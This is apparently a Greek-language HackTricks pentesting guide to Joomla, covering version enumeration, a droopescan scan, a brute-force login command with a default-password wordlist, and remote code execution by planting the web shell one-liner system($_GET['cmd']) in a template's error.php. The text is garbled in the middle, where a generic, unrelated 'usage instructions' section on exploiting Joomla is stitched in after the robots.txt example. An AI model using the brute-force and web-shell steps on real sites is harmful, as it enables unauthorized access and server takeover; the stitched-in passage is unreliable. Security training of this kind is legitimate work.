# Joomla

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

### Στατιστικά Joomla

Το Joomla συλλέγει ορισμένα ανώνυμα [στατιστικά στοιχεία χρήσης](https://developer.joomla.org/about/stats.html) όπως η κατανομή των εκδόσεων Joomla, PHP και βάσεων δεδομένων και των λειτουργικών συστημάτων διακομιστή που χρησιμοποιούνται σε εγκαταστάσεις Joomla. Αυτά τα δεδομένα μπορούν να αναζητηθούν μέσω του δημόσιου [API](https://developer.joomla.org/about/stats/api.html) τους.
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## Απαρίθμηση

### Ανακάλυψη/Ανίχνευση

* Ελέγξτε τα **meta**
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt

Το αρχείο robots.txt χρησιμοποιείται για να επηρεάσει τη συμπεριφορά των κοινοποιητών αναζήτησης σε έναν ιστότοπο. Παρέχει οδηγίες στους κοινοποιητές αναζήτησης σχετικά με το ποιες σελίδες θα πρέπει να αποφεύγουν να επισκεφθούν ή να ευρεθούν στα αποτελέσματα αναζήτησης. Το αρχείο robots.txt βρίσκεται συνήθως στη ρίζα του ιστότοπου και μπορεί να περιέχει οδηγίες για έναν ή περισσότερους κοινοποιητές αναζήτησης.

Οι κοινοποιητές αναζήτησης συνήθως σέβονται τις οδηγίες που περιέχονται στο αρχείο robots.txt, αλλά δεν τις εφαρμόζουν απόλυτα. Ορισμένοι κοινοποιητές αναζήτησης μπορεί να αγνοούν το αρχείο robots.txt ή να το ερμηνεύουν με διαφορετικό τρόπο. Επίσης, το αρχείο robots.txt δεν παρέχει ασφάλεια για τον ιστότοπο, απλά επηρεάζει την πρόσβαση των κοινοποιητών αναζήτησης σε συγκεκριμένες σελίδες.

Για παράδειγμα, η εγγραφή "Disallow: /admin" στο αρχείο robots.txt απαγορεύει στους κοινοποιητές αναζήτησης να επισκεφθούν τη διαδρομή /admin στον ιστότοπο. Αυτό μπορεί να είναι χρήσιμο για την προστασία ευαίσθητων πληροφοριών ή λειτουργιών διαχείρισης από την ανεπιθύμητη πρόσβαση.
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
# Οδηγίες χρήσης

Καλώς ήρθατε στον φάκελο με τις οδηγίες για το Joomla! Εδώ θα βρείτε πληροφορίες σχετικά με την εκμετάλλευση του Joomla! και τεχνικές που μπορείτε να χρησιμοποιήσετε για να πεντεστάρετε την ασφάλεια του.

## Περιεχόμενα

1. [Εισαγωγή στο Joomla!](#εισαγωγή-στο-joomla)
2. [Εκμετάλλευση ευπάθειών](#εκμετάλλευση-ευπάθειών)
3. [Πεντεστάρισμα της ασφάλειας του Joomla!](#πεντεστάρισμα-της-ασφάλειας-του-joomla)

## Εισαγωγή στο Joomla!

Το Joomla! είναι ένα ανοιχτού κώδικα σύστημα διαχείρισης περιεχομένου (CMS) που χρησιμοποιείται για τη δημιουργία και διαχείριση ιστοσελίδων. Είναι γραμμένο σε PHP και χρησιμοποιεί μια βάση δεδομένων για την αποθήκευση του περιεχομένου. Το Joomla! παρέχει μια ευέλικτη και επεκτάσιμη πλατφόρμα για τη δημιουργία ιστοσελίδων με δυνατότητες όπως διαχείριση χρηστών, διαχείριση περιεχομένου και διαχείριση επεκτάσεων.

## Εκμετάλλευση ευπάθειών

Για να εκμεταλλευτείτε ευπάθειες στο Joomla!, μπορείτε να χρησιμοποιήσετε διάφορες τεχνικές όπως:

- Εκμετάλλευση γνωστών ευπαθειών: Αναζητήστε γνωστές ευπάθειες στην έκδοση του Joomla! που χρησιμοποιείτε και εκμεταλλευτείτε τις για να αποκτήσετε πρόσβαση στο σύστημα.
- Επίθεση με χρήση κακόβουλου κώδικα: Εισαγάγετε κακόβουλο κώδικα σε μια ιστοσελίδα Joomla! για να αποκτήσετε πρόσβαση στο σύστημα ή να προκαλέσετε ζημιά.
- Εκμετάλλευση ευπαθειών επεκτάσεων: Αναζητήστε ευπάθειες σε επεκτάσεις του Joomla! και εκμεταλλευτείτε τις για να αποκτήσετε πρόσβαση στο σύστημα.

## Πεντεστάρισμα της ασφάλειας του Joomla!

Για να πεντεστάρετε την ασφάλεια του Joomla!, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- Σάρωση ευπαθειών: Χρησιμοποιήστε εργαλεία σάρωσης ευπαθειών για να αναζητήσετε γνωστές ευπάθειες στο Joomla!.
- Ανάλυση ασφάλειας κώδικα: Ελέγξτε τον κώδικα του Joomla! για πιθανές ευπάθειες και αδυναμίες ασφάλειας.
- Δοκιμή απόρριψης υπηρεσίας (DoS): Δοκιμάστε να προκαλέσετε απόρριψη υπηρεσίας στο Joomla! για να ελέγξετε την αντοχή του σε επιθέσεις DoS.

Για περισσότερες πληροφορίες και τεχνικές, ανατρέξτε στον φάκελο με τις οδηγίες για το Joomla!
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### Έκδοση

* Στο **/administrator/manifests/files/joomla.xml** μπορείτε να δείτε την έκδοση.
* Στο **/language/en-GB/en-GB.xml** μπορείτε να πάρετε την έκδοση του Joomla.
* Στο **plugins/system/cache/cache.xml** μπορείτε να δείτε μια περίπου έκδοση.

### Αυτόματος
```bash
droopescan scan joomla --url http://joomla-site.local/
```
Στην ενότητα [**80,443 - Μεθοδολογία Ελέγχου Ιστού - Ελέγχος Εφαρμογών Πελάτη**](./#cms-scanners) υπάρχει μια ενότητα για τα εργαλεία σάρωσης CMS που μπορούν να σαρώσουν το Joomla.

### Επίθεση με Βίαιη Δύναμη

Μπορείτε να χρησιμοποιήσετε αυτό το [σενάριο](https://github.com/ajnik/joomla-bruteforce) για να προσπαθήσετε να εκτελέσετε επίθεση με βίαιη δύναμη στην είσοδο.
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

Εάν καταφέρετε να αποκτήσετε **διαπιστευτήρια διαχειριστή**, μπορείτε να εκτελέσετε κώδικα **RCE μέσα σε αυτό** προσθέτοντας ένα απόσπασμα **PHP κώδικα** για να αποκτήσετε **RCE**. Μπορούμε να το κάνουμε αυτό **προσαρμόζοντας** ένα **πρότυπο**.

1. **Κάντε κλικ** στο **`Πρότυπα`** στα αριστερά κάτω κάτω από την `Διαμόρφωση` για να εμφανιστεί το μενού προτύπων.
2. **Κάντε κλικ** σε ένα όνομα **προτύπου**. Ας επιλέξουμε το **`protostar`** κάτω από την κεφαλίδα στήλης `Πρότυπο`. Αυτό θα μας οδηγήσει στη σελίδα **`Πρότυπα: Προσαρμογή`**.
3. Τέλος, μπορείτε να κάνετε κλικ σε μια σελίδα για να εμφανιστεί ο **πηγαίος κώδικας** της. Ας επιλέξουμε τη σελίδα **`error.php`**. Θα προσθέσουμε ένα **PHP one-liner για να αποκτήσουμε εκτέλεση κώδικα** ως εξής:
1. **`system($_GET['cmd']);`**
4. **Αποθήκευση & Κλείσιμο**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
